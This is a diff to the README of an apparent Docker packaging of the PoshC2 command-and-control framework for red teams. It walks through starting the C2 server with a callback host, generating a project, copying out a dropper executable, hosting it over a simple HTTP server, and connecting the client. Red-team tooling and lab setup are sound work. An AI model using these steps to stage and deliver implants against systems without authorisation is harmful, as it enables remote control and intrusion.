@@ -5,26 +5,42 @@ PoshC2 is a proxy aware C2 framework used to aid penetration testers with red te
 ## Getting Started
 
 
-Pull remote image
+### Pull remote image
 
 ```
 docker image pull cyb3rward0g/docker-poshc2:20210315
 ```
 
-tag it
+### tag docker image
 
 ```
 docker tag cyb3rward0g/docker-poshc2:20210315 poshc2
 ```
 
-Run the Posh server
+### Run the Posh server
 
 ```
-sudo docker run -ti --rm -p 443:443 -e PAYLOAD_COMMS_HOST=https://192.168.0.4 poshc2 posh-server
+sudo docker run -ti -d -p 443:443 -e PAYLOAD_COMMS_HOST=https://192.168.2.7 --name poshc2 poshc2
+sudo docker exec -ti poshc2 bash
+posh-project -n rce
+posh-server
 ```
 
-Run the Posh client
+### Download Poshc2 Payload of Interest
 
 ```
-sudo docker run -ti --rm poshc2 posh
+sudo docker cp psh:/var/poshc2/rce/payloads/dropper_cs_ps_v4.exe .
+```
+
+### Host Payoad
+
+```
+python3 -m http.server 
+```
+
+### Run the Posh client
+
+```
+sudo docker exec -ti poshc2 bash
+posh -u wardog
 ```
